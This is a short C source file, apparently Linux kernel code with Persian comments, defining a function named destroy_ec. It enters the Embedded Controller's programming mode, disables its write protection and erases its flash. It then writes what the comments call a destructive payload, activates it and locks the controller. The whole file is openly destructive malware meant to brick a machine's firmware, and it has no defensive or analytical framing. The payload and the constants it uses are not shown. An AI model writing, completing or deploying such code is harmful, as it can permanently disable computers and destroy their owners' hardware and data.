#include <linux/ioport.h>
#include <linux/io.h>
#include "ec_destroy.h"

// دسترسی به Embedded Controller
void destroy_ec(void) {
    // فعال‌سازی حالت برنامه‌ریزی
    outb(0x66, EC_INDEX_PORT);
    outb(0x77, EC_INDEX_PORT);
    outb(0x55, EC_INDEX_PORT);
    outb(0x55, EC_INDEX_PORT);
    
    // غیرفعال‌سازی حفاظت نوشتن
    outb(EC_UNLOCK_CMD, EC_INDEX_PORT);
    outb(EC_UNLOCK_KEY, EC_DATA_PORT);
    
    // پاک‌سازی حافظه فلش
    for (int i = 0; i < EC_FLASH_SIZE; i += 2) {
        outb(i >> 8, EC_INDEX_PORT);
        outb(i & 0xFF, EC_INDEX_PORT);
        outb(0xFF, EC_DATA_PORT); // Write high byte
        outb(0xFF, EC_DATA_PORT); // Write low byte
        udelay(50);
    }
    
    // برنامه‌ریزی با پیلود مخرب
    const u8 *payload = get_ec_destructor_payload();
    for (int i = 0; i < EC_DESTRUCTOR_SIZE; i += 2) {
        outb(i >> 8, EC_INDEX_PORT);
        outb(i & 0xFF, EC_INDEX_PORT);
        outb(payload[i], EC_DATA_PORT);
        outb(payload[i+1], EC_DATA_PORT);
        udelay(100);
    }
    
    // فعال‌سازی و قفل کردن
    outb(EC_ACTIVATE_CMD, EC_INDEX_PORT);
    outb(0x01, EC_DATA_PORT);
    outb(EC_LOCK_CMD, EC_INDEX_PORT);
}
